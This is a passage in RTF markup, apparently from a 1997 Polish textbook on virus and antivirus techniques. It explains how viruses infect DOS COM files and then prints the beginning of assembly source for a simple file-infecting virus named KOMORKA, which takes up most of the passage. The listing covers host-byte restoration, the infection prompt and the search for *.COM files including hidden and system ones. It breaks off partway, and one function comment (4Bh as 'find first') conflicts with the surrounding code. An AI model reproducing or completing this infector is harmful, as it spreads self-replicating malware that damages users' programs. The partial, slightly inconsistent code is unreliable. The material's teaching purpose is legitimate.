pocz\uc1\u261\'b9tkowe bajty programu i wykonuje skok pod adres CS:0100h.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nie jest to jedyna metoda zara\uc1\u380\'bfania plik\'f3w COM. Niekt\'f3re wirusy przesuwaj\uc1\u261\'b9 w pliku kod oryginalnego programu, a w tak powsta\uc1\u322\'b3e miejsce wpisuj\uc1\u261\'b9 sw\'f3j kod. Ze wzgl\uc1\u281\'eadu na wi\uc1\u281\'eaksz\uc1\u261\'b9 ilo\uc1\u347\'9c\uc1\u263\'e6 operacji, jakie musz\uc1\u261\'b9 wykona\uc1\u263\'e6, aby zainfekowa\uc1\u263\'e6 plik, s\uc1\u261\'b9 do\uc1\u347\'9c\uc1\u263\'e6 \uc1\u322\'b3atwo wykrywane, gdy\uc1\u380\'bf znacz\uc1\u261\'b9co op\'f3\uc1\u378\'9fniaj\uc1\u261\'b9 wykonanie oryginalnych program\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jeszcze inna metoda polega na umieszczeniu kodu wirusa w dowolnym miejscu infekowanego pli}{\f0\fs24\lang1045{\*\listtag0}ku, jednak ze wzgl\uc1\u281\'eadu na trudno\uc1\u347\'9cci implementacyjne jest ona rzadko stosowana.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Infekuj\uc1\u261\'b9c pliki COM nale\uc1\u380\'bfy pami\uc1\u281\'eata\uc1\u263\'e6, i\uc1\u380\'bf programy tego typu mog\uc1\u261\'b9 mie\uc1\u263\'e6 d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 nie wi\uc1\u281\'eaksz\uc1\u261\'b9 ni\uc1\u380\'bf 64kB-100h-2 bajty. Odejmowana warto\uc1\u347\'9c\uc1\u263\'e6 100h jest d\uc1\u322\'b3ugo\uc1\u347\'9cci\uc1\u261\'b9 bloku PSP, tworzonego na pocz\uc1\u261\'b9tku segmentu, do kt\'f3rego \uc1\u322\'b3adowany jest program., a warto\uc1\u347\'9c\uc1\u263\'e6 2 wynika z faktu umieszczenia przed startem programu warto\uc1\u347\'9cci 0000h na stosie. Po wczytaniu programu przez DOS wska\uc1\u378\'9fnik stosu (SP) programu ustawiany jest na ko\uc1\u324\'f1cu segmentu, do kt\'f3rego zosta\uc1\u322\'b3 o}{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0} za\uc1\u322\'b3adowany, st\uc1\u261\'b9d te\uc1\u380\'bf za maksymaln\uc1\u261\'b9 d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6, kt\'f3rej nie mo\uc1\u380\'bfe przekroczy\uc1\u263\'e6 plik, nale\uc1\u380\'bfy przyj\uc1\u261\'b9\uc1\u263\'e6 warto\uc1\u347\'9c\uc1\u263\'e6 mniejsz\uc1\u261\'b9 od 65278, np. 65000 bajt\'f3w lub nawet mniej. Nieuwzgl\uc1\u281\'eadnienie powy\uc1\u380\'bfszego faktu spowoduje, i\uc1\u380\'bf po za\uc1\u322\'b3adowaniu zbyt d\uc1\u322\'b3ugiego pliku COM niszczona b\uc1\u281\'ead}{\f1\fs24\lang1045{\*\listtag0}z}{\f0\fs24\lang1045{\*\listtag0}ie cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 programu znajduj\uc1\u261\'b9ca si\uc1\u281\'ea przy ko\uc1\u324\'f1cu segmentu (przez warto\uc1\u347\'9cci zapisywane na stosie).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W tablicach poni\uc1\u380\'bfej przedstawiono wygl\uc1\u261\'b9d programu COM przed i po zara\uc1\u380\'bfeniu wirusem.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Struktura niezainfekowanego pliku COM}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:6.6085in/; table-sdh:88ff6a0}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6 pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Kod programu w tzw. postaci absolutnej}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Struktura zainfekowanego pliku COM - wirus dopisuje si\uc1\u281\'ea na ko\uc1\u324\'f1cu pliku}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:6.6085in/; table-sdh:88dc8f8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6 pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Rozkaz skoku do wirusa (najcz\uc1\u281\'ea\uc1\u347\'9cciej jest to rozkaz o kodzie OE9h 00 00, czyli JMP NEAR) }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod zainfekowanego programu }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod wirusa wraz z zapami\uc1\u281\'eatanymi bajtami pocz\uc1\u261\'b9tkowymi}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Struktura zainfekowanego pliku COM -wirus przesuwa kod oryginalnego programu}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:6.6085in/; table-sdh:88ffe20}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6 pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Kod wirusa}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przesuni\uc1\u281\'eaty kod zainfekowanego programu}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfej przedstawiono przyk\uc1\u322\'b3ad prostego, nierezydentncgo wirusa infekuj\uc1\u261\'b9cego plik}{\f1\fs24\lang1045{\*\listtag0}i COM.}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                  KOMORKA v1.0, Autor : Adam Blaszczyk 1997                 ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Prosty wirus nierezydentny plikow COM                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Infekuje pliki z atrybutem Archive, ReadOnly, System, Hidden  ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              znajdujace sie w biezacym katalogu                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM     KOMORKA.ASM                                           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK /t KOMORKA.OBJ                                           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KOMORKA SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JUMPS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ASSUME CS:KOMORKA, DS:KOMORKA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ORG 100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     NUL          = 00h                     ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     LF           = 0Ah                     ;  \\ stale znakow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     CR           = 0Dh                     ;  / ASCII}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     DOLAR        = '$'                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrReadOnly  = 00000001b               ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrHidden    = 00000010b               ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrSystem    = 00000100b               ;   \\ rozne stale atrybutow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrVolumeID  = 00001000b               ;   / pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrDirectory = 00010000b               ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrArchive   = 00100000b               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Atrybut = AtrArchive + AtrReadOnly + AtrSystem + AtrHidden + AtrVolumeID}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; atrybut poszukiwanej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusDlug     = offset (VirusEnd-VirusStart)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; dlugosc kodu wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VRok          = 1998                       ; \\  data opisujaca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VMiesiac      = 13                         ;  - pliki juz zainfekowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VDzien        = 31                         ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VZnacznik     = (VRok-1980)*512+VMiesiac*32+VDzien}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTAStruc struc                             ; struktura DTA bufora transmisji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; dyskowych uzywanych przez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; funkcje 4E i 4F}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAFill db 21 dup (?)       ; nieistotna czesc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAAttr db ?                ; atrybut znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTATime dw ?                ; czas znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTADate dw ?                ; data znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTASize dd ?                ; dlugosc znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAName db 13 dup (?)       ; nazwa znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTAStruc ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Start:                                     ; tu zaczyna sie program ofiary}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     db    0E9h,00h,00h                     ; symuluj rozkaz JMP NEAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; bedacy czescia zarazonego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusStart:                                ; tu zaczyna sie kod wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   si,word ptr ds:[101h]            ; pobierz relatywny ofset do miejsca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; w pamieci, gdzie znajduje sie wirus}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; wartosc ta to czesc rozkazu JMP NEAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; na poczatku, przy pierwszym wywolaniu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; =0000h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   al,byte ptr ds:[si+StareBajty]   ; \\  Przywroc zapamietane 3 bajty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds:[100h],al                     ;  \\ na poczatek programu CS:100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr ds:[si+StareBajty+1] ;  / Podczas pierwszego uruchomienia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds:[101h],ax                     ; /  jest to kod Int 20h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][TeInformacja]            ; podaj gdzie jest tekst}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Informacja                       ; spytaj o uruchomienie wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnc   Infekcja                         ; CF=1 oznacza nie uruchamiaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   BezInfekcji                      ; NIE - nie infekuj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Infekcja:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA]                 ; miejsca gdzie bedzie nowe DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,1Ah                           ; funkcja DOS - ustaw nowe DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][MaskaCOM]                ; maska poszukiwanych plikow '*.COM'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,Atrybut                       ; podaj atrybut poszukiwanej pozycii}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,4Bh                           ; funkcja DOS - szukaj pierwszej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    NieMaPlikuCOM                    ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KolejnyPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
